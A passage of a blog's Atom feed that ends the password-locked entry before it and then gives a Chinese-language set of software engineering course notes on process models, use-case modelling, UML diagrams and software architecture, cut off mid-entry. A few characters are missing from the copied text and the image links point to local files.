    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Welcome to my blog, enter password to read.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    
    <summary type="html">Welcome to my blog, enter password to read.</summary>
    
    
    
    <category term="技术文档" scheme="https://a2914475618.github.io/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
    
    <category term="shiro" scheme="https://a2914475618.github.io/tags/shiro/"/>
    
  </entry>
  
  <entry>
    <title>软件工程</title>
    <link href="https://a2914475618.github.io/2021/09/29/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/"/>
    <id>https://a2914475618.github.io/2021/09/29/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/</id>
    <published>2021-09-29T10:46:09.000Z</published>
    <updated>2021-12-24T08:02:10.157Z</updated>
    
    <content type="html"><![CDATA[<h1 id="软件工程"><a href="#软件工程" class="headerlink" title="软件工程"></a>软件工程</h1><p>声明：该笔记内容来自清华大学软件工程<a href="https://www.xuetangx.com/course/THU08091000367/7754180?channel=i.area.recent_search">软件工程 - 清华大学 - 学堂在线 (xuetangx.com)</a></p><h2 id="软件工程概述"><a href="#软件工程概述" class="headerlink" title="软件工程概述"></a>软件工程概述</h2><h3 id="1-定义"><a href="#1-定义" class="headerlink" title="1.定义"></a>1.定义</h3><ul><li>软件是软件工程的研究对象，也是软件工程的产品形态与客观存在</li><li>工程是将理论和知识应用于实践的科学，其目的是经济有效的解决实际问题</li><li>软件致力解决如何以经济有效的方法开发高质量软件</li><li>包含软件和工程</li></ul><h3 id="2-本质特征"><a href="#2-本质特征" class="headerlink" title="2.本质特征"></a>2.本质特征</h3><ul><li>复杂性</li><li>一致性</li><li>可变性-》造成软件开发困难的原因</li><li>不可见性</li></ul><h3 id="3-面临的挑战"><a href="#3-面临的挑战" class="headerlink" title="3.面临的挑战"></a>3.面临的挑战</h3><ol><li>客户不满意</li><li>项目过程失控</li><li>风险与成本问题</li><li>无力管理团队</li></ol><blockquote><p>软件 能独立存在，需要依附于 定的环境（如硬件、网络以及其他软件）</p><p> 用户层次： 系列实现各种功能的图形化界面</p><p>计算机层次：软件 = 程序 + 数据 + 文档</p><p> 程序：计算机 以接受的 系列指令，运行时 以提供所要求的的功能和性能</p><p> 数据：使得程序能够适当地操作信息的数据结构</p><p> 文档：描述程序的研制过程、方法和使用的图文资料</p></blockquote><h3 id="4-基本概念"><a href="#4-基本概念" class="headerlink" title="4.基本概念"></a>4.基本概念</h3><p>将系统性的、规范化的、 定量的方法应用于软件的开发、运行和维护，即工程化应用到软件商</p><h3 id="5-基本要素"><a href="#5-基本要素" class="headerlink" title="5.基本要素"></a>5.基本要素</h3><ol><li><p>过程</p><p> 一系列开发活动，将客户需求转化成客户满意的产品</p><ol><li>问题定义</li><li>需求开发</li><li>软件设计</li><li>软件构造</li><li>软件测试</li></ol></li><li><p>方法</p><ol><li>面向过程：以算法作为基本构造单元，强调自顶向下的功能分解，将功能和数据进行一定程度的分离</li><li>面向对象：以类为基本程序单元，对象是类的实例化，对象之间以消息传递为基本手段</li><li>面向构件：寻求比类的粒度更大的且易于 用的构件，期望实现软件的再工程</li><li>面向服务：在应用表现层次上将软件构件化，即应用业务过程由服务组 ，而服务由构件组装而 </li></ol></li><li><p>工具</p><ol><li>软件构造工具</li><li>软件测试工具</li><li>软件工程管理工具</li><li>软件维护工具</li><li>软件建模工具</li></ol></li></ol><h3 id="6-软件开发基本策略"><a href="#6-软件开发基本策略" class="headerlink" title="6.软件开发基本策略"></a>6.软件开发基本策略</h3><ol><li><p>软件复用</p><p>构造一个新的系统 必从零做起，直接复用已有的构件进行组装。</p></li><li><p>分而治之</p><p>将一个大的问题分解成若干个简单的问题，然后逐个解决</p></li><li><p>逐步演进</p><p>软件开发是自底向上逐步有序的生长过程</p></li><li><p>优化折中</p></li></ol><h2 id="软件开发过程"><a href="#软件开发过程" class="headerlink" title="软件开发过程"></a>软件开发过程</h2><h3 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1.基本概念"></a>1.基本概念</h3><h4 id="过程方法"><a href="#过程方法" class="headerlink" title="过程方法"></a>过程方法</h4><blockquote><p>过程方法是系统地识别和管理组织内所使用的过程，保证更有效地获得期望的结果</p></blockquote><h4 id="软件过程分类"><a href="#软件过程分类" class="headerlink" title="软件过程分类"></a>软件过程分类</h4><ol><li><p>管理过程</p><p>衡量和评价实现过程和 过程的效能建立起组织的质量管理体系</p></li><li><p>实现过程</p><p>提供有价值的产品或服务的关键性活动</p></li><li><p>支持过程</p></li></ol><h4 id="软件开发过程-1"><a href="#软件开发过程-1" class="headerlink" title="软件开发过程"></a>软件开发过程</h4><ol><li>问题提出</li><li>可行性研究</li><li>可行性分析报告</li><li>需求开发</li><li>软件设计</li><li>软件构造</li><li>软件测试</li><li>软件维护</li><li>软件项目管理</li><li>软件配置管理</li></ol><h3 id="2-软件过程模型"><a href="#2-软件过程模型" class="headerlink" title="2.软件过程模型"></a>2.软件过程模型</h3><blockquote><p>软件过程模型是对软件过程的抽象描述</p></blockquote><h4 id="瀑布模型"><a href="#瀑布模型" class="headerlink" title="瀑布模型"></a>瀑布模型</h4><p>将基本的开发活动看做是一系列界限分明的独立阶段，这是一种计划驱动的软件过程，有利于规范软件开发活动</p><h4 id="原始化模型"><a href="#原始化模型" class="headerlink" title="原始化模型"></a>原始化模型</h4><p>原型是 一个部分开发的产品，用于加强对系统地理解，有助于明确需求和选择可行的设计策略。</p><h4 id="迭代化开发（增量）"><a href="#迭代化开发（增量）" class="headerlink" title="迭代化开发（增量）"></a>迭代化开发（增量）</h4><p>将描述、开发和验证等不同活动交织在 起，在开发过程中建立一系列版本，将系统一部分一部分地逐步交付。</p><h4 id="可转换模型"><a href="#可转换模型" class="headerlink" title="可转换模型"></a>可转换模型</h4><p>利用自动化的手段，通过一系列转换将需求规格化为一个可 交付使用的系统。</p><h2 id="用例建模"><a href="#用例建模" class="headerlink" title="用例建模"></a>用例建模</h2><p>用例是一种描述系统需求的方法，使用用例的方法来描述系统需求的过程就是用例建模。</p><p>1、基本思想：从用户的角度来看，他们并不想了解系统的内部结构和设计，他们所关心的是系统所能提供的服务，也就是被开发出来的系统将是如何被使用的。</p><p>2、用例模型的模型元素：</p><p>①参与者：参与者是指存在于被定义系统外部并与该系统发生交互的人或其他系统，他们代表的是系统的使用者或使用环境。</p><p>② 用 例：用例用于表示系统所提供的服务，它定义了系统是如何被参与者所使用的，它描述的是参与者为了使用系统所提供的某一完整功能而与系统之间发生的一段对话。</p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wps86F9.tmp.jpg" alt="img"> </p><p>③通讯关联：通讯关联用于表示参与者和用例之间对应关系，它表示参与者使用了系统中的哪些服务（用例），或者说系统所提供的服务（用例）是被哪些参与者所使用的。</p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wps86FA.tmp.jpg" alt="img"> </p><p>④系统边界：为了使得各个用例与子系统之间的关系更加明确，通常会使用一个系统边界来表</p><p>达一个子系统所包含的用例范围。</p><h3 id="3、两种表示形式"><a href="#3、两种表示形式" class="headerlink" title="3、两种表示形式"></a>3、两种表示形式</h3><p>①文本描述</p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wps870A.tmp.jpg" alt="img"> </p><p>②用例图</p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wps870B.tmp.jpg" alt="img"> </p><p>注：通讯关联表示的是参与者和用例之间的关系，箭头表示在这一关系，哪一方是对话的发主动发起者，箭头所指方是对话的被动接受者；如果你不想强调对话中的主动与被动关系，可以使用不带箭头的关联实线，在参与者和用例之间的信息流，不是由通讯关联来表示的，该信息流是缺省存在的（用例本身描述的就是参与者和系统之间的对话），并且信息流向是双向的，他与通讯关联箭头所指的方向毫无关系。</p><h3 id="4、用例建模过程"><a href="#4、用例建模过程" class="headerlink" title="4、用例建模过程"></a>4、用例建模过程</h3><p>用例模型主要包括：</p><p>①用例图——确定系统中所包含的参与者、用例和两者之间的对应关系，用例图描述的是关于系统功能的一个概述</p><p>②用例规约——针对每一个用例都应该有一个用例规约文档与之相对应，该文档描述用例的细节内容</p><p>（1）寻找参与者</p><p>参与者——所有存在于系统外部并与系统进行交互的人或其他系统</p><p>系统开发完成之后，有哪些人会使用这个系统？</p><p>系统需要从哪些人或其他系统中获得数据？</p><p>系统会为哪些人或其他系统提供数据？</p><p>系统会与哪些其他系统相关联？</p><p>系统是由谁来维护和管理的？</p><p>（2）识别用例</p><p>找到参与者之后，我们就可以根据参与者来确定系统的用例，主要是看各参与者需要系统提供什么样的服务，或者说参与者是如何使用系统的。</p><p>参与者为什么要使用该系统？</p><p>参与者是否会在系统中创建、修改、删除、访问、存储数据？如果是的话，参与者又是如何来完成这些操作的？</p><p>参与者是否会将外部的某些事件通知给该系统？</p><p>系统是否会将内部的某些事件通知该参与者？</p><p>（3）关联</p><p>在一般的用例图中，我们只表述参与者和用例之间的关系，即它们之间的通讯关联。除此之外，我们还可以描述参与者与参与者之间的泛化(generalization)、用例和用例之间的包含(include)、扩展(extend)和泛化(generalization)关系。我们利用这些关系来调整已有的用例模型，把一些公共的信息抽取出来重用，使得用例模型更易于维护。但是在应用中要小心选用这些关系，一般来说这些关系都会增加用例和关系的个数，从而增加用例模型的复杂度。而且一般都是在用例模型完成之后才对用例模型进行调整，所以在用例建模的初期不必要急于抽象用例之间的关系。</p><h2 id="面向对象分析及UML类图"><a href="#面向对象分析及UML类图" class="headerlink" title="面向对象分析及UML类图"></a>面向对象分析及UML类图</h2><h3 id="1、面向对象分析"><a href="#1、面向对象分析" class="headerlink" title="1、面向对象分析"></a>1、面向对象分析</h3><p>Ÿ 面向对象分析技术关注应用领域中的实体，并将其建模为对象</p><p>Ÿ 面向对象分析技术主要基于分类、泛华、聚合关系在对象集合之间建立结构</p><p>Ÿ 对象的行为是执行预定的动作（服务/活动）</p><p>Ÿ 对象通过执行动作来完成状态变迁</p><h3 id="2、面向对象分析的起源"><a href="#2、面向对象分析的起源" class="headerlink" title="2、面向对象分析的起源"></a>2、面向对象分析的起源</h3><p>Ÿ 面向对象程序设计（OPP）：将OPP中的概念上推到分析和设计阶段</p><p>Ÿ 数据库设计：将数据语义建模概念，如实体—关系、泛华、聚合和分类用于系统分析和设计</p><p>Ÿ 结构化分析：将结构化分析方法与技术，如SDAT方法等用于系统分析与建模</p><p>Ÿ 知识表示：采用基于问题框架和语义网络的知识表示方法</p><h3 id="3、面向对象分析方法举例"><a href="#3、面向对象分析方法举例" class="headerlink" title="3、面向对象分析方法举例"></a>3、面向对象分析方法举例</h3><p>Ÿ <img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wpsB967.tmp.jpg" alt="img">Peter Coad的面向对象方法</p><p>Ÿ “对象”是问题领域中真实存在的实体，有“定义清晰的边界” </p><p>Ÿ 对象中封装有属性和行为</p><p>Ÿ 面向对象分析的五个核心概念：对象、属性、结构、服务和主题</p><h3 id="4、结构"><a href="#4、结构" class="headerlink" title="4、结构"></a>4、结构</h3><p>①结构/一般-特殊结构：一般-特殊结构将类组织成基于集成关系的分层次结构</p><p>Ÿ 自底向上是从特殊到一般的类</p><p>Ÿ 自顶向下是从一般到特殊的类</p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wpsB968.tmp.jpg" alt="img"> </p><p>②整体-部分结构</p><p>整体部分结构描述对象间的组合关系</p><p>一个交通灯对象由0-3个灯组，支撑杆和位置对象组合而成</p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wpsB969.tmp.jpg" alt="img"> </p><h3 id="5、服务"><a href="#5、服务" class="headerlink" title="5、服务"></a>5、服务</h3><p>①服务建模</p><p>对象为其周遭的其他对象提供服务，例如医生对象对外提供的服务包括体检、出体检报告等</p><p>Coad 的OAA方法中，定义了三中类型的服务：</p><p>Ÿ 瞬时服务：对象的创建、结束、修改等</p><p>Ÿ 计算服务：对象为其他对象完成计算服务等</p><p>Ÿ 监控服务：对象持续监控流程，检查预设条件是否满足</p><p>我们用带箭头的虚线来表示一个对象引用另一个对象的服务</p><p>注：从面向对象到面向服务，是看待问题的视角的切换</p><p>②服务关系</p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wpsB979.tmp.jpg" alt="img"> </p><h3 id="6、面向对象的分析方法学"><a href="#6、面向对象的分析方法学" class="headerlink" title="6、面向对象的分析方法学"></a>6、面向对象的分析方法学</h3><p>Ÿ 识别对象和类（类是对象的抽象定义）</p><p>Ÿ 识别类之间的关系，建立由继承和组合关系组成的类层次结构</p><p>Ÿ 定义主题，通过主题将对象模型组织成多个抽象层次或视角，一般来说通过继承关系或整体部分关系联系起来的类同属于一个主题</p><p>Ÿ 识别各个对象内部的属性信息，并将其赋予相应抽象层次的类</p><p>Ÿ 为每个类定义服务    </p><p>7、面向对象分析常用术语对照表</p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wpsB97A.tmp.jpg" alt="img"> </p><p>CRC卡片分拣法</p><p>1、识别类的方法</p><p>Ÿ 根据用例描述中的名词确定类的候选者</p><p>Ÿ 使用CRC卡分析法寻找类</p><p>Ÿ 根据边界类、控制类和实体类的划分来帮助发现系统中的类</p><p>Ÿ 对领域进行分析，或利用已有的领域分析结果得到类</p><p>Ÿ 参考分析、设计模式来确定类</p><p>2、CRC卡片</p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wpsB97B.tmp.jpg" alt="img"> </p><p>注：类对象通常对应一个命名实体，因此用名词表达</p><p>3、对象</p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wpsB97C.tmp.jpg" alt="img"> </p><p>4、类识别</p><p>Ÿ 从原始资料中识别类：找出干系人提交的问题描述中名词及短语（如果他描述应用领域中的信息结构或本质，则加入模型）</p><p>Ÿ 从其他来源识别：背景信息调查、用户及干系人提供、分析模式</p><p>Ÿ 最好识别处尽可能多的候选类：之后逐步按照其价值功用进行选择、明确判断后排除一个类要比不考虑来的合理</p><p>5、识别类的功能职责</p><p>功能职责关乎动作，因此是问题描述中的动词</p><p>注意：</p><p>1、并非所有动词均将成为类职责</p><p>2、有时多个动作合并为一个职责</p><p>3、随着分析过程深入会发现新的职责</p><p>4、不断修正类定义和职责定义</p><p>5、当两个类分享职责时，为二者同时添加该职责</p><p>4、类筛选</p><p>Ÿ 在候选类中排除一下类：</p><p>超出问题关注的范围的类</p><p>指代整个系统的类</p><p>功能重复的类</p><p>过于含糊或过于具体的类</p><p>可观察到的现象是，实例对象过多或过少</p><p>Ÿ Coad &amp;Yourdon’s的筛选原则：</p><p>保存对象信息：系统需要保存对象信息吗？</p><p>提供所需服务：类对象是否对外提供修改属性值的操作？</p><p>具有多个属性：只有一个属性的类，应该建模为属性</p><p>具有公共属性：类属性是否为所有实例对象共享？</p><p>具有公共操作：类操作是否为所有实例对象共享？</p><p>外部实体：如果生产或使用对象的信息，也应考虑建模为系统类</p><p>类图建模</p><p>1、什么是类</p><p>具有相同性质、相同行为、相同的对象关系、相同语义的对象的集合</p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wpsB97D.tmp.jpg" alt="img"> </p><p>2、对象</p><p>Ÿ 对象是类的实例</p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wpsB98E.tmp.jpg" alt="img"> </p><p>注：两个不同的对象可以有相同的属性取值</p><p>Ÿ 对象与其他对象之间发生关联关系</p><p>Ÿ 注意将属性划归正确的类</p><p>3、类属性定义</p><p>属性在类图标的属性分隔框中用文字串说明，UML规定属性的语法为：</p><p>[可见性]属性名[：类型]{[多样性[次序]]}[=c初始值][{约束}]</p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wpsB98F.tmp.jpg" alt="img"><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wpsB990.tmp.jpg" alt="img"> </p><p>4、类关系</p><p>Ÿ 对象并非遗世独立，对象间存在千丝万缕的联系</p><p>UML中，关注一下几种类型的关系：</p><p>Ÿ 关联关系：聚合与组合关系</p><p>Ÿ 泛华关系</p><p>Ÿ 依赖关系</p><p>Ÿ 实现关系</p><p>Ÿ 类图描述类和他们之间的关系</p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wpsB991.tmp.jpg" alt="img"> </p><p>5、关联关系的种类</p><p>按照关联所连接的类的数量，对象类之间的关联可分为：自反关联、二元关联，N元关联</p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wpsB992.tmp.jpg" alt="img"> </p><p>关联关系图例</p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wpsB993.tmp.jpg" alt="img"> </p><p>6、关联类</p><p>有时要为关联相关信息的存储定义一个专门的类，称为“关联类”</p><p>保存与关联关系本身相关的信息</p><p>这些信息不属于关联所连接的两端的类</p><p>例：“title”类的对象中存储的是车主和车辆之间所属关系有关的信息</p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wpsB9A4.tmp.jpg" alt="img"> </p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wpsB9A5.tmp.jpg" alt="img">7、限定关联</p><p>在关联端紧靠源类图标处可以有限定符。带有限定符的关联称为限定关联。</p><p>Ÿ 限定符是关联的属性</p><p>Ÿ 限定符的作用是，给定关联一段的一个对象和限定符值，可确定另一端的一个对象或对象集</p><p>8、聚合与组合关系</p><p>Ÿ 聚合用于表达一个整体对象与其他成员对象之间的关系</p><p>Ÿ 组合用于表达一个整体对象与其组成部分之间的关系</p><p>Ÿ 组合关系所表达的整体类与部分类之间的所属关系更强</p><p>整体类的对象不存在时，部分类的对象也不存在</p><p>整体类对象撤销之前要复杂将部分类对象撤销</p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wpsB9A6.tmp.jpg" alt="img"> </p><p>9、继承/泛华</p><p>Ÿ 子类继承父类的属性、关联和操作</p><p>Ÿ 子类可以覆盖继承的内容</p><p>Ÿ 父类可以声明为抽象类，则将不会为它直接创建实例对象</p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wpsB9A7.tmp.jpg" alt="img"> </p><p>Ÿ 继承/泛华关系建模的意义在于系统环境发生变化时便于添加新的子类</p><p>Ÿ 继承/泛华关系建模的过程</p><p>自顶向下——将某个类分割为属性和操作不同的子类，或者发现关联关系定义的是分类关系</p><p>自底向上——为现有的多个具有公共属性及方法的类，定义一个父类</p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wpsB9A8.tmp.jpg" alt="img"> </p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wpsB9A9.tmp.jpg" alt="img"> <img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wpsB9B9.tmp.jpg" alt="img"></p><p>10、类图的抽象</p><p>在软件开发的不同阶段使用的类图具有不同的抽象层次。概念类、设计说明类和实现类。最先由Steve Cook和John Daniels引入。</p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wpsB9BA.tmp.jpg" alt="img"> </p><p>11、类图建模风格</p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wpsB9BB.tmp.jpg" alt="img"> </p><h2 id="软件系统设计"><a href="#软件系统设计" class="headerlink" title="软件系统设计"></a>软件系统设计</h2><h3 id="1软件体系结构概念"><a href="#1软件体系结构概念" class="headerlink" title="1软件体系结构概念"></a>1软件体系结构概念</h3><p>1.1概念</p><p>软件体系结构包括构成系统的设计元素的描述、设计元素之间的交互、设计元素的组合模式以及这这些模式中的约束。</p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wps261D.tmp.jpg" alt="img"> </p><p>1.2目标</p><p>ž 如何将复杂的软件系统划分成模块</p><p>ž 如何规范模块的构成</p><p>ž 如何将这些模块组织成为完整的系统</p><p>ž 如何保证系统的质量要求</p><p>注：当系统的规模和复杂度不断增大的时候，构造整个系统的关键是对整个系统的结构和行为进行抽象。</p><h3 id="2-软件体系结构-构件-连接件-约束"><a href="#2-软件体系结构-构件-连接件-约束" class="headerlink" title="2.软件体系结构=构件+连接件+约束"></a>2.<strong>软件体系结构=构件+连接件+约束</strong></h3><p>2.1构件</p><p>构件是具有某种功能的可复用的软件结构单元，表示系统中主要的计算元素和数据存储</p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wps261E.tmp.jpg" alt="img"> </p><p>①构件组合成系统</p><p>②构件提供服务，通过结构与其他构件进行交互</p><p>2.2连接件</p><p>连接件是负责构件之间交互的专用构件，如管道</p><p>构件是软件功能设计和实现的承载体</p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wps261F.tmp.jpg" alt="img"> </p><p>连接机制：过程调用、中断、I/O、事件、进程、线程、共享、同步、并发、消息、远程调用、动态连接、API等等</p><p>连接协议： 对过程调用来说——参数的个数和类型、参数排列次序</p><p>​      对消息传送来说——消息的格式</p><h3 id="3-软件体系结构的目标"><a href="#3-软件体系结构的目标" class="headerlink" title="3.软件体系结构的目标"></a>3.软件体系结构的目标</h3><p>可重用性、可扩展性、可改变性、简单性、有效性</p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wps2620.tmp.jpg" alt="img"> </p><p>4.软件体系结构的发展</p><p>面向过程的分析与设计——面向对象的分析与设计——基于构件的软件开发——面向服务的计算、面向服务的体系结构</p><p>设计的趋势：分布式、低耦合、开放</p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wps2621.tmp.jpg" alt="img"> </p><p>5.风格、模式和框架</p><p>主程序 - 子程序，树形结构，如C程序</p><p>面向对象，网状结构，如CPP/JAVA程序</p><p>管道 - 过滤器，通过输入和输出串联，线性结构，如媒体播放器</p><p>仓库结构，以数据为中心，放射状结构，如剪贴板、编译器、数据库</p><p>层次结构</p><p>客户机 - 服务器</p><p>表示层 -（功能层）- 数据层</p><p>MVC结构：Model 模型、视图 View、控制器 Controller，前端给后端AJAX，后端返回给前端JSON</p><p>REST，RE presentational State Transfer</p><p>事件风格，以代码调试为例</p><p>调试器设置断点，作为事件源</p><p>IDE作为事件管理器，事件触发时发出消息</p><p>文本编辑器、编译器、变量监视器对断点事件进行响应，相当于event handler</p><p>具体实现分为发布订阅模式和观察者模式</p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wps2622.tmp.jpg" alt="img"> </p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wps2623.tmp.jpg" alt="img"> </p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wps2624.tmp.jpg" alt="img"> </p><p>6.软件设计原则</p><p>6.1抽象——关注事物中与问题相关部分而忽略其他无关部分的一种思考方法</p><p>6.2封装和信息隐藏——每个软件单元对其他所有单元都隐藏自己的设计决策，各个单元的特性通过其外部可见的接口来描述</p><p>要求：应将单元接口设计得尽可能简单，并将单元对于环境的假设和要求降至最低</p><p>6.3模块化——在逻辑和物理上将整个系统分解成多个更小的部分，其实质是“分而治之”，即将一个复杂问题分解成若干个简单问题，然后逐个解决</p><p>系统分解的目标：高内聚、低耦合</p><p>内聚性是一个模块或子系统内部的依赖程度</p><p>耦合性是两个模块或子系统之间依赖关系的强度</p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wps2635.tmp.jpg" alt="img"> <img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wps2636.tmp.jpg" alt="img"></p><p>6.4层次化——</p><p>分层：  每一层可以访问下层，不能访问上层；分层机构：每一层只能访问与其相邻的下一层；开放式结构：每一层还可以访问下面更低的层次；层次数目不应超过7±2层</p><p>划分：系统被分解成互相对等的若干模块单元；每个模块之间依赖较少，可以独立运行</p><p>注：模块单元增加了处理开销，过度分层或划分会增加复杂性</p><p>6.5复用——利用某些已开发的、对建立新系统有用的软件元素来生成新的软件系统，其好处在于提高生产效率，提高软件质量 </p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wps2637.tmp.jpg" alt="img"> </p><p>7.客户机/服务器结构</p><p>客户机/服务器体系结构是一种分布式系统模型，作为服务器的子系统为其他客户机的子系统提供服务，作为客户机的子系统负责与用户的交互</p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wps2638.tmp.jpg" alt="img"> </p><p>7.1两层C/S结构（胖客户端模型）</p><p>业务逻辑的划分比重：</p><p>胖客户端：客户端执行大部分的数据处理操作</p><p>瘦客户端：客户端具有很少或没有业务逻辑</p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wps2639.tmp.jpg" alt="img"> </p><p>7.2三层C/S结构 </p><p>表示层：包括所有与客户机交互的边界对象，如窗口、表单、网页等</p><p>功能层：包括所有的控制和实体对象，实现应用程序的处理逻辑和规则</p><p>数据层：实现对数据库的存储、查询和更新</p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wps263A.tmp.jpg" alt="img"> </p><p>7.3B/S结构</p><p>浏览器/服务器结构是三层C/S风格的一种实现方式</p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wps263B.tmp.jpg" alt="img"> </p><p>8.Web系统架构设计</p><p>9.数据库选择策略</p><p>l 关系型，规整的表格；key-value型，灵活的内容</p><p>l 事务，即对数据库的一次操作确保原子性，完全执行或不执行</p><p>l 一致性，A发照片，好友都能看到；理想情况要求实时，现实中允许一定延迟</p><p>l 主要的数据库类型：</p><p>n MySQL，关系型数据库，支持事务操作，安全性高</p><p>n MongoDB，非关系型数据库，结构灵活，数据模型易扩展易修改，分布式，不支持事务操作，安全性一般</p><p>n Redis，内存数据库，速度快，数据安全性差</p><p>l 需要事务操作 - MySQL，发展中的业务 - MongoDB，频繁读取 - Redis</p><h2 id="UML活动图及其建模"><a href="#UML活动图及其建模" class="headerlink" title="UML活动图及其建模"></a>UML活动图及其建模</h2><h3 id="1、简介"><a href="#1、简介" class="headerlink" title="1、简介"></a>1、简介</h3><p>一个UML活动图表示一个过程中的多个顺序活动和并行活动。这些活动图有助于对业务过程、工作流、数据流和复杂算法进行建模。</p><h3 id="2、活动图基本元素"><a href="#2、活动图基本元素" class="headerlink" title="2、活动图基本元素"></a>2、活动图基本元素</h3><p><strong>初始节点和活动终点</strong></p><p>用一个实心圆表示初始节点</p><p>用一个圆圈加一个实心圆表示活动终点</p><p><strong>活动节点</strong></p><p>矩形（四角圆弧）</p><p><strong>转换</strong></p><p>当一个活动结束时，控制流就会马上传递给下一个活动节点，在活动图中称之为“转换”，用一条带箭头的直线来表示</p><p><strong>分支与监护条件</strong></p><p>分支用菱形表示，他有一个进入转换（箭头从外指向内分支符号），一个或多个离开转换（箭头从分支符号指向外）。而每个离开转换上都会有一个监护条件，用来表示满足什么条件的时候执行该转换</p><p><strong>分岔与汇合</strong></p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wpsF58A.tmp.jpg" alt="img"> </p><p><strong>泳道</strong></p><p><img src="file:///C:\Users\LUSIR~1\AppData\Local\Temp\ksohtml\wpsF58B.tmp.jpg" alt="img"> </p><p>3、准则</p><p>ž 活动图通常对于设计众多参与者的非常复杂的业务过程，建模具有价值。对于简单的业务过程，用例文本就足够用了。</p><p>ž 在进行业务过程建模时，可以利用耙字符号和子活动图。</p><p>ž 与上一条相关的是，尽量保持同一张图中所有动作几点的抽象水平一致。</p><p>UML状态机图及其建模</p><p>1、简介</p><p>UML状态机图描述了某个对象的状态和感兴趣的时间以及对象响应该事件的行为。</p><p>通常我们创建一个UML状态图是为了以下的研究目的：研究类、角色、子系统、或组件的复杂行为。</p><p>2、状态机图基本元素</p><p><strong>状态</strong></p><p>状态指的是对象在其生命周期中的一种状况，处于某个特定状态中的对象必然会满足某些条件、执行某些动作或者是等待某些事件。一个状态的生命周期是一个有限的时间阶段。</p><p><strong>转换</strong></p><p>转换指的是两个不同状态之间的一种关系，表明对象在第一个状态中执行一定的动作，并且在满足某个特定条件下由某个事件触发进入第二个状态。</p><p><strong>事件</strong></p><p>事件指的是发生在时间和空间上的对状态机来讲有意义的那些事情。事件通常会引起状态的变迁，促使状态机从一种状态切换到另一种状态，如信号、对象额度创建和销毁等。</p><p><strong>活动</strong></p><p>活动指的是状态机中进行的非原子操作。</p><p><strong>动作</strong></p><p>动作指的是状态机中可以执行的哪些原子操作。所谓原子操作，指的是他们在运行的过程中不能被其他消息中断，必须一直执行下去，以至最终导致状态的变更或者返回一个值。</p><h2 id="详细设计及结构化程序"><a href="#详细设计及结构化程序" class="headerlink" title="详细设计及结构化程序"></a>详细设计及结构化程序</h2><h3 